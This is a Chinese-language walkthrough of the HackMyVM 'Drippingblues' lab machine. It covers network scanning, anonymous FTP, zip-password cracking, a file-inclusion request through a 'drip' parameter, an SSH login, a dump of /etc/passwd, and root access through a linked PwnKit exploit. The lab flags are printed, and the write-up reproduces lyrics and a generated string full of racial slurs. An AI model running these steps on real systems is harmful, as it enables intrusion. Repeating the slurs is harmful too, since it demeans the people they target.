---
title: HMV-Drippingblues
description: Tested on and exported from virtualbox.
pubDate: 01 13 2026
image: /mechine/Drippingblues.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

# 信息收集
## IP定位
```plain
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.100   08:00:27:91:92:9c       (Unknown)
```

## nmap扫描
```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 11:23 EST
Nmap scan report for mail.codeshield.hmv (192.168.0.100)
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

## 80端口
```plain
 driftingblues is hacked again so it's now called drippingblues. :D hahaha
by
travisscott & thugger 

driftingblues 又一次被黑了，所以现在改名叫 drippingblues。😄 哈哈哈
作者：
travisscott 和 thugger
```



### 目录扫描(dirsearch + gobuster)
```plain
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```

```plain
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh
```

```plain
你好，亲爱的黑客菜鸟，

去看看这首歌的歌词：
https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

统计里面所有的 n-word（nigger 的缩写）出现次数，把它们一个接一个拼在一起，然后对结果做 md5 校验

例如：hellohellohellohello → 对 hellohellohellohello 执行 md5sum

这个 md5 值就是 SSH 的密码
```

### 歌词处理
```plain
<div>
<!-- Usage of azlyrics.com content by any third-party lyrics provider is prohibited by our licensing agreement. Sorry about that. -->
<i>[Young Thug:]</i><br>
Pour that shit up fool, it's ours<br>
Ha<br>
Monster!<br>
Man so you ain't gon' pour?<br>
Oh, so you're gonna make a nigga beg you to pour?<br>
Okay bool, you dig?<br>
(Wheezy Beats)<br>
Uh<br>
<br>
Hopped out my motherfuckin' bed<br>
Hopped in the motherfuckin' coupe (Skrrt)<br>
Pulled up on the Birdman (Brr)<br>
I'm a beast, I'm a beast, I'm a mobster (Ayy)<br>
You got 50 whole bands, you'll be my sponsor (Just for the night)<br>
Them snakes on the plane, me and Kanye-conda (Anacondas)<br>
Yeah (Them anacondas)<br>
I might piece him up and let my partner smoke him (Triple cross)<br>
Chuck-E-Cheese him up, I pizza him, I roll him (Cross)<br>
I'm a gangster, I don't dance, baby I poke<br>
Right now I'm surrounded by some gangsters from Magnolia<br>
I heard I put it in the spot, yes sir she told me<br>
My niggas muggin', these niggas YSL only<br>
I heard my Nolia niggas not friendly, like no way<br>
But we not friendly either, you know it<br>
Ha!<br>
Yeah, thumbs up<br>
I've seen more holes than a golf course on Donald Trump's course<br>
My bitch a tall blooded horse, nigga, bronco<br>
And if you catch us down bet you're not gon' trunk us (No)<br>
You got a body, lil' nigga, we got a ton of 'em (Yeah)<br>
You got some Robin's, lil' nigga, we got some Batmans<br>
I let that choppa go &quot;blocka, blocka,&quot; get back, son (Back)<br>
You got them MJs, nigga, I got them Jacksons (Racks)<br>
<br>
But really what is it to do<br>
When the whole world constantly hatin' on you?<br>
Pussy niggas hold their nuts, masturbatin' on you<br>
Meanwhile the fuckin' federal baitin' on you<br>
Nigga tell me what you do<br>
Would you stand up or would you turn to a pussy nigga?<br>
I got a hundred things to do<br>
And I can stop rappin' but I can't stop stackin' fuckin' figures<br>
<br>
<i>[Birdman &amp; Young Thug:]</i><br>
Yeah, I'm from that motherfuckin' 'Nolia, nigga ('Nolia, nigga)<br>
Birdman'll break a nigga nose, lil' nigga (Nose, lil' nigga, ah)<br>
You need to slow your fuckin' roll, lil' nigga (Roll, lil' nigga, Thugger)<br>
We created Ks on shoulders, nigga (Shoulders, nigga)<br>
I'm a scary fuckin' sight, lil' nigga (Sight, lil' nigga, ah)<br>
We won a hundred mil' on fights, lil' nigga (Fights, lil' nigga, hey)<br>
A hundred bands, sure you're right, lil' nigga (Right, lil' nigga)<br>
I keep some AKs on my flights, lil' nigga (My flights, lil' nigga, I do)<br>
Birdman Willie B (What?)<br>
Smoke some stunna blunts, now my eyes Chinese (Chinese)<br>
Hundred K on private flights overseas (Overseas)<br>
Choppas City nigga, free BG (BG)<br>
Bentley with the doors all 'round, not a Jeep (Jeep)<br>
Rich nigga shit, smoke two pounds in a week (In a week)<br>
Can't find a bitch that don't know we them streets (We them streets)<br>
Bitches know that I am Birdman, that's OG, brrat<br>
<br>
<i>[Young Thug:]</i><br>
But really what is it to do<br>
When the whole world constantly hatin' on you?<br>
Pussy niggas hold their nuts, masturbatin' on you<br>
Meanwhile the fuckin' federal baitin' on you<br>
Nigga tell me what you do<br>
Would you stand up or would you turn to a pussy nigga?<br>
I got a hundred things to do<br>
And I can stop rappin' but I can't stop stackin' fuckin' figures<br>
<br>
Nigga, I'm a crack addict<br>
Thought about lettin' them get a cut<br>
Then I went and snagged at it<br>
Yeah, the new Boosie Badazz at it<br>
I'ma drop a nigga life, just like a bad habit<br>
I stick to the ground like a motherfuckin' rug<br>
I'm a big dog, lil' fuck nigga, you a pup<br>
Lil' bitch, clean your drawers before you think you're a thug<br>
Before I be in front your shows, just like your pub<br>
I ain't even lyin', baby<br>
I swear to God I ain't lyin', baby, no<br>
First I'll screw you without these pliers, baby, or<br>
I might dap you like, &quot;good try, baby&quot;<br>
Big B livin', baby<br>
Them boys on my left throwin' up Cs<br>
I promise their mama see them this week<br>
And I don't break promises with my Ds (Them my dogs)<br>
I want Ms and cheese, mister Mickey Ds<br>
She know I am a beast, I am so obese (Rrar)<br>
In Miami I swear they don't got good weed<br>
Wiz Khalifa can you send me some weed please?<br>
<br>
<i>[Birdman:]</i><br>
Yeah, overseas, nigga, top floor, clear windows, nigga<br>
Glass house, drankin' GT, you understand?<br>
We in that Red Light District, you understand?<br>
We 3 and 1, that mean 3 on me, nigga, you understand me?<br>
Just livin' the life, boy, ayy, Thug, just a dollar for a 1, nigga<br>
We can blow a mil', boy<br>
Rich Gang, YSL, blatt!
</div>

<br>
<br>
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sed 's/<[^>]*>//g' lyrics.html > lyrics.txt
                                                                                                    
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# grep -oiw 'nigga\|niggas' lyrics.txt | wc -l

40

┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# yes nigga | head -n 40 | tr -d '\n' > payload.txt
cat payload.txt
md5sum payload.txt

nigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigga
67aff0e8f24f431a9f31899e0c18839b  payload.txt
```

得到密码67aff0e8f24f431a9f31899e0c18839b

## 21端口
```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# ftp 192.168.0.100 
Connected to 192.168.0.100.
220 (vsFTPd 3.0.3)
Name (192.168.0.100:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||32468|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
226 Directory send OK.
ftp> get respectmydrip.zip
local: respectmydrip.zip remote: respectmydrip.zip
229 Entering Extended Passive Mode (|||13382|)
150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).
100% |***************************************************************|   471        2.03 MiB/s    00:00 ETA
226 Transfer complete.
471 bytes received in 00:00 (783.57 KiB/s)
ftp> 
```

## 压缩包解密
尝试解压发现有密码，进行破解

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# unzip respectmydrip.zip 
Archive:  respectmydrip.zip
[respectmydrip.zip] respectmydrip.txt password: 
password incorrect--reenter:                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# zip2john respectmydrip.zip > hash
ver 2.0 respectmydrip.zip/respectmydrip.txt PKZIP Encr: cmplen=32, decmplen=20, crc=5C92F12B ts=96AB cs=5c92 type=0
ver 2.0 respectmydrip.zip/secret.zip is not encrypted, or stored with non-handled compression type
                                                                                                            
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
072528035        (respectmydrip.zip/respectmydrip.txt)     
1g 0:00:00:01 DONE (2026-01-12 11:46) 0.6666g/s 9284Kp/s 9284Kc/s 9284KC/s 072551..0713932315
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```plain
just focus on "drip"

关键就在 ‘drip’”
```

## 网页解密
结合之前的/robots.txt中Disallow: /etc/dripispowerful.html

拼接链接

[http://192.168.0.100/?drip=/etc/dripispowerful.html](http://192.168.0.100/?drip=/etc/dripispowerful.html)

```plain
</style>
password is:
imdrippinbiatch
</body>
</html>

<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>
```

 👉 **密码是：**  
**imdrippinbiatch**

**尝试解压secret.zip失败了**

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# unzip secret.zip       
Archive:  secret.zip
[secret.zip] secret.txt password: 
password incorrect--reenter: 
```

# ssh连接
在网页端我们得知俩个作者为travisscott & thugger

尝试登录

thugger/imdrippinbiatch

成功登录

```plain
thugger@drippingblues:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
thugger@drippingblues:~$ cat user.txt
5C50FC503A2ABE93B4C5EE3425496521
```

```plain
thugger@drippingblues:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
thugger:x:1001:1001:,,,:/home/thugger:/bin/bash
sshd:x:126:65534::/run/sshd:/usr/sbin/nologin
mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:128:134:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop/tools/linux-exploit-suggester]
└─# scp linux-exploit-suggester.sh thugger@192.168.0.100:/tmp/

thugger@192.168.0.100's password: 
linux-exploit-suggester.sh                                                100%   89KB  37.2MB/s   00:00 
```

```plain
thugger@drippingblues:/tmp$ ./linux-exploit-suggester.sh 

Available information:

Kernel version: 5.11.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: highly probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
```

# 提权
 pwnkit的漏洞 

[https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)

```plain
thugger@drippingblues:/tmp$ vi root.py
thugger@drippingblues:/tmp$ python3 root.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1001(thugger) groups=1001(thugger)
```

```plain
root.txt
# cat root.txt
78CE377EF7F10FF0EDCA63DD60EE63B8
```

